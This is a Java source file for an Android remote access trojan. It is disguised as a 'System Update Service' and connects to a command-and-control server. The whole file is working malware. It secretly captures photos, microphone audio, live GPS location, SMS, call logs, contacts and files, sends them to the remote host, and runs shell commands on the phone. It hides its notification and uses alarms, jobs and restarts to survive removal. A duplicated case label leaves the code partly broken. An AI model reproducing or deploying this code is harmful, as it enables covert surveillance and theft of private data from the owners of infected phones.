package com.android.system.update;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.RemoteException;
import android.os.SystemClock;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.content.pm.PackageManager;

import com.android.system.update.modules.*;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class RATService extends Service {
    private static final String CHANNEL_ID = "SystemUpdateChannel";
    private static final int NOTIFICATION_ID = 1337;
    private static final String TAG = "SystemService";
    private static final int JOB_ID = 1001;
    private static final int PERSISTENCE_JOB_ID = 1002;
    private static final long RESTART_DELAY_MS = 5000;
    private static final long CHECK_INTERVAL_MS = 45000;
    
    // Simple timeouts like working code
    private static final int CONNECT_TIMEOUT = 15000; // 15 seconds
    private static final int RETRY_INTERVAL = 30; // seconds
    private static final int READ_TIMEOUT_CHECK = 300000; // 5 minutes - just in case
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private ExecutorService executor;
    private static volatile RATService instance;
    private PowerManager.WakeLock wakeLock;
    private int consecutiveFailures = 0;
    
    // Location tracking variables
    private LocationManager locationManager;
    private LocationListener locationListener;
    private HandlerThread locationThread;
    private Handler locationHandler;
    private boolean isLocationTracking = false;
    
    // Modules
    private CameraModule cameraModule;
    private MicModule micModule;
    private LocationModule locationModule;
    private SmsModule smsModule;
    private CallsModule callsModule;
    private ContactsModule contactsModule;
    private FileModule fileModule;
    private ShellModule shellModule;
    private DeviceModule deviceModule;
    
    // Binder for GuardianService communication
    public class RATServiceBinder extends Binder {
        public void heartbeat() throws RemoteException {
            if (!isRunning.get()) {
                throw new RemoteException("Service is not running");
            }
        }
    }
    
    private final RATServiceBinder binder = new RATServiceBinder();
    
    public static RATService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        AppController.setConnectionService(this);
        
        Log.d(TAG, "System service initialized");
        
        // Acquire wake lock to prevent CPU sleep
        acquireWakeLock();
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize location manager
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        startLocationThread();
        
        // Initialize modules based on config
        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
        deviceModule = new DeviceModule(this);
        
        // Schedule all persistence mechanisms
        scheduleAllJobs();
        
        // Set that service should run on boot
        setRunOnBoot(true);
        
        // Single executor thread for connection handling
        executor = Executors.newSingleThreadExecutor();
        
        // Start connection thread
        startConnection();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("System optimization service");
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        int icon = android.R.drawable.stat_sys_download_done;
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("Optimizing system performance")
            .setSmallIcon(icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SystemService::WakeLock"
            );
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(10 * 60 * 1000L); // 10 minute timeout, will auto-renew
            Log.d(TAG, "Wake lock acquired");
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire wake lock", e);
        }
    }
    
    private void startLocationThread() {
        locationThread = new HandlerThread("LocationThread");
        locationThread.start();
        locationHandler = new Handler(locationThread.getLooper());
    }
    
    private void scheduleAllJobs() {
        scheduleJobSchedulerRestart();
        schedulePersistenceJob();
        scheduleCheckAlarm();
    }
    
    private void scheduleCheckAlarm() {
        Intent intent = new Intent(this, RestartReceiver.class);
        intent.setAction("CHECK_SERVICE");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 3, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            } else {
                alarmManager.setExact(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            }
            Log.d(TAG, "Check alarm scheduled for " + (CHECK_INTERVAL_MS/1000) + " seconds");
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "System service onStartCommand");
        
        // Restart connection if it's not running
        if (executor == null || executor.isShutdown()) {
            executor = Executors.newSingleThreadExecutor();
            startConnection();
        }
        
        scheduleAllJobs();
        return START_STICKY;
    }
    
    private void schedulePersistenceJob() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
                        .setPeriodic(15 * 60 * 1000)
                        .setPersisted(true)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .setBackoffCriteria(30000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                jobScheduler.schedule(jobInfo);
                Log.d(TAG, "Persistence job scheduled");
            } catch (Exception e) {
                Log.e(TAG, "Error scheduling persistence job", e);
            }
        }
    }
    
    private void scheduleJobSchedulerRestart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
                        .setMinimumLatency(RESTART_DELAY_MS)
                        .setOverrideDeadline(RESTART_DELAY_MS * 2)
                        .setPersisted(true)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                jobScheduler.schedule(jobInfo);
                Log.d(TAG, "Restart job scheduled");
            } catch (Exception e) {
                Log.e(TAG, "Failed to schedule restart job", e);
            }
        }
    }
    
    private void setRunOnBoot(boolean shouldRun) {
        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("should_run", shouldRun).apply();
    }
    
    private boolean isConnected() {
        return socket != null && socket.isConnected() && !socket.isClosed() && out != null;
    }
    
    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        } catch (Exception e) {
            return false;
        }
    }
    
    private void startConnection() {
        if (executor == null || executor.isShutdown()) {
            executor = Executors.newSingleThreadExecutor();
        }
        
        executor.execute(() -> {
            int retryCount = 0;
            int consecutiveNetworkErrors = 0;
            
            while (isRunning.get()) {
                try {
                    // Check if network is available first
                    if (!isNetworkAvailable()) {
                        Log.d(TAG, "No network available, waiting...");
                        Thread.sleep(RETRY_INTERVAL * 1000);
                        continue;
                    }
                    
                    // Reset network error counter on successful check
                    consecutiveNetworkErrors = 0;
                    
                    // Connect with timeout
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
                    socket.setKeepAlive(true);
                    
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    
                    Log.d(TAG, "✅ Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
                    
                    // Reset counters on successful connection
                    consecutiveFailures = 0;
                    retryCount = 0;
                    
                    // Send initial device info
                    sendDeviceInfo();
                    
                    // Main processing loop - blocks on readLine()
                    String line;
                    long lastReadTime = System.currentTimeMillis();
                    
                    while (isRunning.get() && (line = in.readLine()) != null) {
                        lastReadTime = System.currentTimeMillis();
                        processCommand(line);
                    }
                    
                    // Check if we've been stuck too long (safety check)
                    if (System.currentTimeMillis() - lastReadTime > READ_TIMEOUT_CHECK) {
                        Log.w(TAG, "Read timeout check triggered, reconnecting...");
                    }
                    
                } catch (SocketTimeoutException e) {
                    Log.e(TAG, "Socket timeout", e);
                    consecutiveFailures++;
                } catch (IOException e) {
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    consecutiveFailures++;
                    consecutiveNetworkErrors++;
                } catch (InterruptedException e) {
                    Log.e(TAG, "Sleep interrupted", e);
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Unexpected error", e);
                    consecutiveFailures++;
                } finally {
                    closeConnection();
                }
                
                // Keep trying forever - NO MAX RETRIES LIMIT
                if (isRunning.get()) {
                    // Calculate delay with exponential backoff
                    long delay;
                    if (consecutiveFailures < 5) {
                        delay = RETRY_INTERVAL * 1000; // 30 seconds
                    } else if (consecutiveFailures < 10) {
                        delay = 60000; // 1 minute
                    } else if (consecutiveFailures < 20) {
                        delay = 120000; // 2 minutes
                    } else {
                        delay = 300000; // 5 minutes max
                    }
                    
                    // If we have too many network errors, increase wait time
                    if (consecutiveNetworkErrors > 5) {
                        Log.w(TAG, "Multiple network errors, waiting longer...");
                        delay = Math.max(delay, 60000); // At least 1 minute
                    }
                    
                    retryCount++;
                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + ")");
                    
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException ie) {
                        Log.e(TAG, "Reconnect sleep interrupted", ie);
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            
            // If we exit the loop, schedule a full service restart
            Log.w(TAG, "Connection loop ended, scheduling service restart");
            scheduleRestartWithAlarm();
        });
    }
    
    private void closeConnection() {
        try {
            if (out != null) {
                out.close();
                out = null;
            }
            if (in != null) {
                in.close();
                in = null;
            }
            if (socket != null && !socket.isClosed()) {
                socket.close();
                socket = null;
            }
        } catch (IOException e) {
            Log.e(TAG, "Error closing connection", e);
        }
    }
    
    private void sendDeviceInfo() {
        String info = String.format("DEVICE|%s|%s|%s|%s|%s",
            getUniqueDeviceId(),
            Build.MANUFACTURER,
            Build.MODEL,
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT
        );
        sendCommand(info);
        Log.d(TAG, "Sent device info: " + info);
    }
    
    private void sendCommand(String data) {
        if (out != null) {
            try {
                // For very large data, send in chunks
                if (data.length() > 65536) { // 64KB threshold
                    Log.d(TAG, "Large response detected (" + data.length() + " chars), sending in chunks");
                    
                    // Send header with total size
                    out.println("FILE_CHUNK|START|" + data.length());
                    out.flush();
                    
                    // Send in 32KB chunks
                    int chunkSize = 32768;
                    for (int i = 0; i < data.length(); i += chunkSize) {
                        int end = Math.min(i + chunkSize, data.length());
                        String chunk = data.substring(i, end);
                        out.println("FILE_CHUNK|DATA|" + i + "|" + chunk);
                        out.flush();
                        
                        // Small delay to prevent overwhelming the socket
                        try {
                            Thread.sleep(10);
                        } catch (InterruptedException e) {
                            // Ignore
                        }
                    }
                    
                    // Send end marker
                    out.println("FILE_CHUNK|END");
                    out.flush();
                } else {
                    // Normal size, send normally
                    out.println(data);
                    out.flush();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending command", e);
            }
        }
    }
    
    private void processCommand(String command) {
        Log.d(TAG, "Received raw command: " + command);
        
        // Try to parse as JSON first (for backward compatibility)
        if (command.trim().startsWith("{")) {
            try {
                JSONObject jsonCmd = new JSONObject(command);
                String cmd = jsonCmd.optString("command", "").toLowerCase().trim();
                String args = jsonCmd.optString("args", "");
                
                Log.d(TAG, "Parsed JSON command: " + cmd + " with args: " + args);
                
                // Route JSON commands
                routeCommand(cmd, args);
                return;
            } catch (JSONException e) {
                Log.d(TAG, "Not a valid JSON command, trying pipe format");
            }
        }
        
        // Handle pipe-delimited format
        String[] parts = command.split("\\|", 2);
        String cmd = parts[0].toLowerCase().trim();
        String args = parts.length > 1 ? parts[1] : "";
        
        Log.d(TAG, "Parsed pipe command: " + cmd + " with args: " + args);
        
        // Route the command
        routeCommand(cmd, args);
    }
    
    private void routeCommand(String cmd, String args) {
        switch (cmd) {
            case "ping":
                sendCommand("PONG");
                break;
                
            case "help":
                String helpText = "Available commands: info, location, location_stream [start/stop], camera, camera_switch, camera_info, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
                sendCommand("HELP|" + helpText);
                break;
                
            case "info":
            case "device_info":
                if (deviceModule != null) {
                    String result = deviceModule.getDeviceInfo();
                    sendCommand("INFO|" + result);
                } else {
                    sendCommand("INFO|ERROR: Device module not available");
                }
                break;
                
            case "location":
            case "get_location":
                if (locationModule != null) {
                    String result = locationModule.getLocation();
                    sendCommand("LOCATION|" + result);
                } else {
                    sendCommand("LOCATION|ERROR: Location module not available");
                }
                break;
                
            case "location_stream":
                handleLocationStreamCommand(args);
                break;
                
            case "camera":
           case "camera":
case "camera_photo":
    if (cameraModule != null) {
        Log.d(TAG, "📸 Taking photo with camera module");
        cameraModule.takePhoto(new CameraModule.CameraCallback() {
            @Override
            public void onPhotoTaken(String base64Image) {
                Log.d(TAG, "📸 Photo taken, sending response");
                sendCommand(base64Image);
            }
            
            @Override
            public void onError(String error) {
                Log.e(TAG, "📸 Camera error: " + error);
                sendCommand(error);
            }
        });
    } else {
        Log.e(TAG, "📸 Camera module is null");
        sendCommand("CAMERA|ERROR: Camera module not available");
    }
    break;
                
            case "camera_switch":
                if (cameraModule != null) {
                    String result = cameraModule.switchCamera();
                    sendCommand(result); // This already includes "CAMERA_SWITCH|" prefix
                } else {
                    sendCommand("CAMERA_SWITCH|ERROR: Camera module not available");
                }
                break;
                
            case "camera_info":
                if (cameraModule != null) {
                    String result = cameraModule.getCurrentCameraInfo();
                    sendCommand(result); // This already includes "CAMERA_INFO|" prefix
                } else {
                    sendCommand("CAMERA_INFO|ERROR: Camera module not available");
                }
                break;
                
            case "sms":
            case "get_sms":
                if (smsModule != null) {
                    String result = smsModule.getSms();
                    sendCommand("SMS|" + result);
                } else {
                    sendCommand("SMS|ERROR: SMS module not available");
                }
                break;
                
            case "calls":
            case "get_calls":
                if (callsModule != null) {
                    String result = callsModule.getCallLogs();
                    sendCommand("CALLS|" + result);
                } else {
                    sendCommand("CALLS|ERROR: Calls module not available");
                }
                break;
                
            case "contacts":
            case "get_contacts":
                if (contactsModule != null) {
                    String result = contactsModule.getContacts();
                    sendCommand("CONTACTS|" + result);
                } else {
                    sendCommand("CONTACTS|ERROR: Contacts module not available");
                }
                break;
                
            // FILE OPERATIONS
            case "files_list":
            case "list_files":
                if (fileModule != null) {
                    String result = fileModule.listFiles(args);
                    sendCommand("FILES|" + result);
                } else {
                    sendCommand("FILES|ERROR: File module not available");
                }
                break;
                
            case "file_get":
            case "download":
                if (fileModule != null) {
                    String result = fileModule.getFile(args);
                    sendCommand("FILE_GET|" + result);
                } else {
                    sendCommand("FILE_GET|ERROR: File module not available");
                }
                break;
                
            case "file_delete":
            case "delete":
                if (fileModule != null) {
                    String result = fileModule.deleteFile(args);
                    sendCommand("FILE_DELETE|" + result);
                } else {
                    sendCommand("FILE_DELETE|ERROR: File module not available");
                }
                break;
                
            case "file_rename":
            case "rename":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.renameFile(parts2[0], parts2[1]);
                    sendCommand("FILE_RENAME|" + result);
                } else {
                    sendCommand("FILE_RENAME|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "create_folder":
            case "mkdir":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.createFolder(parts2[0], parts2[1]);
                    sendCommand("CREATE_FOLDER|" + result);
                } else {
                    sendCommand("CREATE_FOLDER|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "file_zip":
            case "zip":
                if (fileModule != null) {
                    String result = fileModule.zipFile(args);
                    sendCommand("FILE_ZIP|" + result);
                } else {
                    sendCommand("FILE_ZIP|ERROR: File module not available");
                }
                break;
                
            case "file_upload":
            case "upload":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 3);
                    if (parts2.length == 3) {
                        String result = fileModule.uploadFile(parts2[0], parts2[1], parts2[2]);
                        sendCommand("FILE_UPLOAD|" + result);
                    } else {
                        sendCommand("FILE_UPLOAD|ERROR: Invalid format");
                    }
                } else {
                    sendCommand("FILE_UPLOAD|ERROR: File module not available");
                }
                break;
                
            case "search_files":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.searchFiles(parts2[0], parts2[1]);
                    sendCommand("SEARCH_FILES|" + result);
                } else {
                    sendCommand("SEARCH_FILES|ERROR: Invalid format");
                }
                break;
                
            case "storage_info":
                if (fileModule != null) {
                    String result = fileModule.getStorageInfo();
                    sendCommand("STORAGE_INFO|" + result);
                } else {
                    sendCommand("STORAGE_INFO|ERROR: File module not available");
                }
                break;
                
            case "test_folder":
                if (fileModule != null) {
                    String result = fileModule.testFolder(args);
                    sendCommand("TEST|" + result);
                } else {
                    sendCommand("TEST|ERROR: File module not available");
                }
                break;
                
            case "mic":
            case "mic_start":
                if (micModule != null) {
                    String result = micModule.startRecording(30);
                    sendCommand("MIC|" + result);
                } else {
                    sendCommand("MIC|ERROR: Microphone module not available");
                }
                break;
                
            case "mic_stop":
                if (micModule != null) {
                    String result = micModule.stopRecording();
                    sendCommand("MIC_STOP|" + result);
                } else {
                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
                }
                break;
                
            case "sms_send":
                if (smsModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = smsModule.sendSms(parts2[0], parts2[1]);
                    sendCommand("SMS_SEND|" + result);
                } else {
                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "shell":
            case "exec":
                if (shellModule != null) {
                    String result = shellModule.executeCommand(args);
                    sendCommand("SHELL|" + result);
                } else {
                    sendCommand("SHELL|ERROR: Shell module not available");
                }
                break;
                
            default:
                sendCommand("UNKNOWN_CMD|" + cmd);
                break;
        }
    }
    
    // Handle location streaming commands
    private void handleLocationStreamCommand(String args) {
        args = args.trim().toLowerCase();
        
        if (args.equals("start") || args.equals("begin") || args.equals("on")) {
            startLocationTracking();
        } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
            stopLocationTracking();
        } else if (args.isEmpty()) {
            // Return current tracking status
            sendCommand("LOCATION_STREAM|" + (isLocationTracking ? "active" : "inactive"));
        } else {
            sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
        }
    }
    
    // Start live location tracking
    private void startLocationTracking() {
        if (!checkLocationPermission()) {
            sendCommand("LOCATION_STREAM|error: No location permission");
            return;
        }
        
        if (isLocationTracking) {
            sendCommand("LOCATION_STREAM|already active");
            return;
        }
        
        try {
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    // Send location update immediately
                    String locationJson = createLocationJson(location);
                    sendCommand("LOCATION_UPDATE|" + locationJson);
                    Log.d(TAG, "Location update sent: " + location.getLatitude() + "," + location.getLongitude());
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {
                    Log.d(TAG, "Location provider status changed: " + provider + " status: " + status);
                }
                
                @Override
                public void onProviderEnabled(String provider) {
                    Log.d(TAG, "Location provider enabled: " + provider);
                }
                
                @Override
                public void onProviderDisabled(String provider) {
                    Log.d(TAG, "Location provider disabled: " + provider);
                    sendCommand("LOCATION_STREAM|warning: " + provider + " disabled");
                }
            };
            
            // Request location updates every 3 seconds, or when device moves 5 meters
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    3000,   // 3 seconds
                    5,      // 5 meters
                    locationListener,
                    locationHandler.getLooper()
                );
                Log.d(TAG, "GPS location tracking started");
            }
            
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    3000,
                    5,
                    locationListener,
                    locationHandler.getLooper()
                );
                Log.d(TAG, "Network location tracking started");
            }
            
            isLocationTracking = true;
            sendCommand("LOCATION_STREAM|started");
            
            // Get initial location immediately
            Location lastLocation = getBestLastKnownLocation();
            if (lastLocation != null) {
                String locationJson = createLocationJson(lastLocation);
                sendCommand("LOCATION_UPDATE|" + locationJson);
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception starting location tracking", e);
            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error starting location tracking", e);
            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
        }
    }
    
    // Stop live location tracking
    private void stopLocationTracking() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            locationListener = null;
            isLocationTracking = false;
            sendCommand("LOCATION_STREAM|stopped");
            Log.d(TAG, "Location tracking stopped");
        } else {
            sendCommand("LOCATION_STREAM|already inactive");
        }
    }
    
    // Get best last known location
    private Location getBestLastKnownLocation() {
        Location bestLocation = null;
        
        try {
            if (checkLocationPermission()) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (gpsLocation != null && (bestLocation == null || 
                        gpsLocation.getAccuracy() < bestLocation.getAccuracy())) {
                        bestLocation = gpsLocation;
                    }
                }
                
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (networkLocation != null && (bestLocation == null || 
                        networkLocation.getAccuracy() < bestLocation.getAccuracy())) {
                        bestLocation = networkLocation;
                    }
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception getting last known location", e);
        }
        
        return bestLocation;
    }
    
    // Check location permission
    private boolean checkLocationPermission() {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED ||
               ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    // Create JSON from location
    private String createLocationJson(Location location) {
        try {
            JSONObject json = new JSONObject();
            json.put("latitude", location.getLatitude());
            json.put("longitude", location.getLongitude());
            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
            json.put("provider", location.getProvider());
            json.put("time", location.getTime());
            json.put("timestamp", System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            return "{\"error\":\"JSON creation error\"}";
        }
    }
    
    private String getUniqueDeviceId() {
        SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
        String deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = java.util.UUID.randomUUID().toString();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        return deviceId;
    }
    
    private void scheduleRestartWithAlarm() {
        Intent restartIntent = new Intent(this, RATService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 1, restartIntent, 
            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
                pendingIntent);
            Log.d(TAG, "Restart scheduled");
        }
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed - normal operation");
        scheduleAllJobs();
        scheduleRestartWithAlarm();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "System service onDestroy");
        
        // Stop location tracking
        stopLocationTracking();
        
        // Clean up modules
        if (cameraModule != null) {
            cameraModule.cleanup();
            cameraModule = null;
        }
        
        // Clean up location thread
        if (locationThread != null) {
            locationThread.quitSafely();
            try {
                locationThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        
        isRunning.set(false);
        AppController.clearConnectionService();
        instance = null;
        
        closeConnection();
        
        if (executor != null) {
            executor.shutdownNow();
            executor = null;
        }
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        scheduleAllJobs();
        scheduleRestartWithAlarm();
        
        super.onDestroy();
    }
}
